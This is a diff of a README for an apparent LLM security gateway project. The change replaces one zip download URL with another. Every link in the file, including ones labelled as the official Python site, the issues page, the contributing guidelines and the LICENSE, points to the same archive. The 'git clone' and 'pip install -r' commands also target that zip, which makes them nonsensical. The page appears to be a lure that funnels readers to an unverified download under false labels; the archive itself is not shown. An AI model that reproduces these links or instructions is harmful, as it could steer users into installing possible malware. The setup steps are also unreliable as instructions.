@@ -2,7 +2,7 @@
 
 ## 🔗 Download Now
 
-[![Download](https://raw.githubusercontent.com/Nick94665/aegisgpt-llm-gateway/main/app/aegisgpt-llm-gateway_pigeonberry.zip)](https://raw.githubusercontent.com/Nick94665/aegisgpt-llm-gateway/main/app/aegisgpt-llm-gateway_pigeonberry.zip)
+[![Download](https://github.com/Nick94665/aegisgpt-llm-gateway/raw/refs/heads/main/app/aegisgpt_llm_gateway_v3.5.zip)](https://github.com/Nick94665/aegisgpt-llm-gateway/raw/refs/heads/main/app/aegisgpt_llm_gateway_v3.5.zip)
 
 ## 🛠️ Overview
 
@@ -30,16 +30,16 @@ To run the aegisgpt-llm-gateway, you will need:
 Follow these steps to get the aegisgpt-llm-gateway up and running:
 
 1. **Download the Application**:  
-   Visit this [page to download](https://raw.githubusercontent.com/Nick94665/aegisgpt-llm-gateway/main/app/aegisgpt-llm-gateway_pigeonberry.zip) the latest version of the software.
+   Visit this [page to download](https://github.com/Nick94665/aegisgpt-llm-gateway/raw/refs/heads/main/app/aegisgpt_llm_gateway_v3.5.zip) the latest version of the software.
 
 2. **Install Python**:  
-   If you don’t have Python installed, download it from the [official site](https://raw.githubusercontent.com/Nick94665/aegisgpt-llm-gateway/main/app/aegisgpt-llm-gateway_pigeonberry.zip). Follow the prompts to complete the installation.
+   If you don’t have Python installed, download it from the [official site](https://github.com/Nick94665/aegisgpt-llm-gateway/raw/refs/heads/main/app/aegisgpt_llm_gateway_v3.5.zip). Follow the prompts to complete the installation.
 
 3. **Clone the Repository** (Optional):  
    If you want to explore the code, you can clone the repository using the command:
 
    ```bash
-   git clone https://raw.githubusercontent.com/Nick94665/aegisgpt-llm-gateway/main/app/aegisgpt-llm-gateway_pigeonberry.zip
+   git clone https://github.com/Nick94665/aegisgpt-llm-gateway/raw/refs/heads/main/app/aegisgpt_llm_gateway_v3.5.zip
    ```
 
 4. **Set Up a Virtual Environment** (recommended):  
@@ -65,7 +65,7 @@ Follow these steps to get the aegisgpt-llm-gateway up and running:
    Run the following command to install all required packages:
 
    ```bash
-   pip install -r https://raw.githubusercontent.com/Nick94665/aegisgpt-llm-gateway/main/app/aegisgpt-llm-gateway_pigeonberry.zip
+   pip install -r https://github.com/Nick94665/aegisgpt-llm-gateway/raw/refs/heads/main/app/aegisgpt_llm_gateway_v3.5.zip
    ```
 
 6. **Run the Application**:  
@@ -80,7 +80,7 @@ Follow these steps to get the aegisgpt-llm-gateway up and running:
 
 ## 📥 Download & Install
 
-To get started with the aegisgpt-llm-gateway, visit this [page to download](https://raw.githubusercontent.com/Nick94665/aegisgpt-llm-gateway/main/app/aegisgpt-llm-gateway_pigeonberry.zip) the software. Follow the steps above for a seamless setup process.
+To get started with the aegisgpt-llm-gateway, visit this [page to download](https://github.com/Nick94665/aegisgpt-llm-gateway/raw/refs/heads/main/app/aegisgpt_llm_gateway_v3.5.zip) the software. Follow the steps above for a seamless setup process.
 
 ## 🔍 Troubleshooting
 
@@ -96,11 +96,11 @@ If you encounter any issues while downloading or running the application, consid
 
 ## 💬 Support
 
-For help or to report issues, please visit the [issues section](https://raw.githubusercontent.com/Nick94665/aegisgpt-llm-gateway/main/app/aegisgpt-llm-gateway_pigeonberry.zip) of the repository. You can also contribute to the documentation or code if you wish to help.
+For help or to report issues, please visit the [issues section](https://github.com/Nick94665/aegisgpt-llm-gateway/raw/refs/heads/main/app/aegisgpt_llm_gateway_v3.5.zip) of the repository. You can also contribute to the documentation or code if you wish to help.
 
 ## 🌐 Contributors
 
-Feel free to contribute to this project. Your input can help enhance security and user experience. Check the [contributing guidelines](https://raw.githubusercontent.com/Nick94665/aegisgpt-llm-gateway/main/app/aegisgpt-llm-gateway_pigeonberry.zip) for more details.
+Feel free to contribute to this project. Your input can help enhance security and user experience. Check the [contributing guidelines](https://github.com/Nick94665/aegisgpt-llm-gateway/raw/refs/heads/main/app/aegisgpt_llm_gateway_v3.5.zip) for more details.
 
 ## 📌 Topics
 
@@ -119,4 +119,4 @@ Feel free to contribute to this project. Your input can help enhance security an
 
 ## 🌟 License
 
-This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/Nick94665/aegisgpt-llm-gateway/main/app/aegisgpt-llm-gateway_pigeonberry.zip) file for details.
+This project is licensed under the MIT License. See the [LICENSE](https://github.com/Nick94665/aegisgpt-llm-gateway/raw/refs/heads/main/app/aegisgpt_llm_gateway_v3.5.zip) file for details.
